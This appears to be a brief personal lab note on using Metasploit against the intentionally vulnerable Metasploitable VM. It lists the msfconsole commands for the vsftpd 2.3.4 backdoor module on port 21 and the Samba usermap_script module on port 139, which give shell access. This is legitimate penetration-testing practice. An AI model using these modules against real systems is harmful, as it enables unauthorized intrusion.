---
description: exploiting vulnerabilities
---

# Metasploit

Load the metasploit framework using `msfconsole`

## Exploiting open port 21 in metasploitable using metasploit

we search the port 21 vulnerability on google, stumbled on rapid7 (metasploit) website and get a guide to perform this attack.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor     # launching the attack
```

```bash
show options    # shows the available options for the vulnerablity.
set RHOST 192.168.81.132    # we use 'set' to set the 'RHOST' to the correct ip addr.
```

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-22 03-00-37.png" alt=""><figcaption><p>after executing the set RHOST cmd</p></figcaption></figure>

after setting the RHOST and RPORT, type `exploit` to execute the attack, we now have access to the machine.

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-22 03-01-19.png" alt=""><figcaption><p><code>exploit</code></p></figcaption></figure>

## Exploiting open port 139 in metasploitable using metasploit

`use exploit/multi/samba/usermap_script`

same method as with port 21.





